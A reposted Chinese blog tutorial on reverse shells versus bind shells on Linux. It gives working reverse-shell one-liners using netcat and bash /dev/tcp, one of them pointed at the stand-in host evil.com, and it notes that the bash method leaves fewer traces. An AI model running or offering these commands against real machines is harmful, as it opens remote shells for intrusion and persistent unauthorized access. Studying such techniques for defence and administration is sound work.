# 反向shell - xqhrs232的专栏 - CSDN博客
2017年04月24日 18:05:40[xqhrs232](https://me.csdn.net/xqhrs232)阅读数：294
个人分类：[Linux/Ubuntu/Fedora](https://blog.csdn.net/xqhrs232/article/category/906931)
原文地址::[http://www.ttlsa.com/linux/reverse-shell/](http://www.ttlsa.com/linux/reverse-shell/)
相关文章
1、Linux Shellcode 绑定端口（正向连接和反向连接)----[http://tieba.baidu.com/p/1729885304](http://tieba.baidu.com/p/1729885304)
2、[How
 to run the linux/x86/shell_reverse_tcp payload stand alone?](http://stackoverflow.com/questions/20926910/how-to-run-the-linux-x86-shell-reverse-tcp-payload-stand-alone)----[http://stackoverflow.com/questions/20926910/how-to-run-the-linux-x86-shell-reverse-tcp-payload-stand-alone](http://stackoverflow.com/questions/20926910/how-to-run-the-linux-x86-shell-reverse-tcp-payload-stand-alone)
3、如何使用NetCat或BASH创建反向Shell来执行远程Root命令----[http://www.vaikan.com/create-reverse-shell-to-remotely-execute-root-commands-using-netcat-or-bash/](http://www.vaikan.com/create-reverse-shell-to-remotely-execute-root-commands-using-netcat-or-bash/)
反向[shell](http://www.ttlsa.com/shell/)(Reverse shell)是一种往远程机器发送shell命令的技术，当远程机器处在防火墙等其它东西后面时，这种技术会变得非常有用。你也许会说，“一个普通的shell或简单的SSH通道不是也能实现这些吗？”不，无法实现。在网上，我看到很多人对普通shell和反向shell之间的区别分不清。在我们开始下面的内容前，先弄清楚这些概念。
1. 反向Shell(Reverse Shell)
反向shell的工作方式是远程计算机将自己的shell发送给特定的用户，而不是将shell绑定到一个端口上。后者在很多环境中是无法访问的。这样，你就可以对远程服务器执行root命令。
2. Bind Shell
bind shell是用户用BSAH，将shell绑定到一个本地端口上，这样任何人都可以在本地网络中发送命令。
反向shell经常会被黑客用来做一些不法行为，例如入侵了一台服务器后，他们会设置一个反向shell，将来他们就能通过这个shell轻松的访问这台远程计算机。我相信你是不会用它来做这种事情的。
3. 环境要求
远程Unix主机
安装了netcat
4. 使用NetCat实现反向shell交互
当通过shell登录到远程主机后，下面的指令能轻松的将shell发送到你的机器上：
# nc -c /bin/sh <你的IP> <任何一个未封锁的端口>
你甚至能通过netcat来pipe BASH。
# /bin/sh | nc <你的IP> <任何未封锁的端口>
然后监听这个shell：
# nc -l -p <相同的端口> -vvv
5. 通过BASH实现反向shell
这种技术是当远程机器上没有netcat或你想做一些非自然的事情而不想留下太重的痕迹时使用。
监听shell：
# nc -l -p <任何未封锁的端口> -vvv
先创建一个新的描述符，分配到一个网络节点。这样我们可以对这个描述符进行读写。
# exec 5<>/dev/tcp/evil.com/<相同的端口> $ cat <&5 | while read line; do $line 2>&5 >&5; done
或另外一个反向shell：
# 0<&196;exec 196<>/dev/tcp/<你的IP>/<相同的端口>; sh <&196 >&196 2>&196
![bash](http://www.ttlsa.com/wp-content/uploads/2013/12/create-reverse-shell.jpg)
这样，你就可以轻松是通过netcat发送任何命令了。
转自http://www.aqee.net/create-reverse-shell-to-remotely-execute-root-commands-using-netcat-or-bash/
